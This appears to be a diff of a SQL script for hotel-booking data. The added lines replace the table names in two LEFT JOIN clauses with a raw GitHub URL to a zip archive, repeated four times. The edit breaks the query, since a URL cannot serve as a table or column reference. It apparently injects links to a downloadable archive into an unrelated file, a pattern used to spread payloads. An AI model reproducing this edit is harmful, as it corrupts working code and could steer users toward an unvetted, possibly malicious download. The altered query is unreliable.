@@ -20,7 +20,7 @@ union
 select * from dbo.['2020$'])
 
 select * from hotels
-left join dbo.market_segment$
-on hotels.market_segment=market_segment$.market_segment
-left join dbo.meal_cost$
-on hotels.meal=dbo.meal_cost$.meal
+left join https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$
+on https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$.market_segment
+left join https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$
+on https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$.meal
